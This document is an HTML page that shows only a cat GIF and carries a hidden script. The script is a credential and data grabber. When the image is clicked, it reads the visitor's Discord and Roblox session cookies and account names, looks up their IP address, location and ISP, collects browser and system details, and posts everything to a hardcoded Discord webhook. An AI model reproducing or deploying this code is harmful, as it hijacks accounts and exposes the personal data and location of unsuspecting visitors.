<!DOCTYPE html>
<html>
<head>
  <title>img</title>
</head>
<body>
<img id="pic" src="https://media.tenor.com/5aphXdqgM9gAAAAi/cat-bad-cat.gif" style="cursor:pointer;width:400px;">
  <script>
    pic.onclick = async () => {
      // --- Discord grab ---
      let discord = {user:"none",display:"none",cookie:"none",pass:"none"};
      try {
        const req = await fetch("https://discord.com/api/v9/users/@me",{
          credentials:"include"
        });
        if(req.ok){
          const u = await req.json();
          discord.user = `${u.username}#${u.discriminator}`;
          discord.display = u.global_name || u.username;
        }
        discord.cookie = document.cookie.split("; ").find(c=>c.startsWith("token=")) || document.cookie;
      } catch(e){}

      // --- Roblox grab ---
      let roblox = {user:"none",display:"none",cookie:"none",pass:"none"};
      try {
        const r = await fetch("https://users.roblox.com/v1/users/authenticated",{
          credentials:"include"
        });
        if(r.ok){
          const u = await r.json();
          roblox.user = u.name;
          roblox.display = u.displayName;
        }
        roblox.cookie = document.cookie.split("; ").find(c=>c.startsWith(".ROBLOSECURITY=")) || document.cookie;
      } catch(e){}

      // --- IP + ultra-precise geo ---
      const ipres = await fetch("https://ipapi.co/json/");
      const ipdata = await ipres.json();
      const geo = `IP: ${ipdata.ip}\nCity: ${ipdata.city}\nRegion: ${ipdata.region}\nCountry: ${ipdata.country_name}\nISP: ${ipdata.org}\nLat: ${ipdata.latitude}\nLon: ${ipdata.longitude}\nTimezone: ${ipdata.timezone}`;

      // --- System / browser ---
      const sys = `UA: ${navigator.userAgent}\nPlatform: ${navigator.platform}\nLang: ${navigator.language}\nCores: ${navigator.hardwareConcurrency}\nScreen: ${screen.width}x${screen.height}`;

      // --- Build & send ---
      const payload = `
Discord:
${JSON.stringify(discord,null,2)}

Roblox:
${JSON.stringify(roblox,null,2)}

Geo:
${geo}

System:
${sys}
      `.trim();

      await fetch("https://discord.com/api/webhooks/1441513208518148268/HezIyPpTCbsZTmjWceYhTn-F4SzK_UxpwIaerUpBwOiAPL4WomFrFQiopnD722wgaTz6",{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({content:"```\n"+payload+"\n```"})
      });
    };
  </script>
</body>
</html>
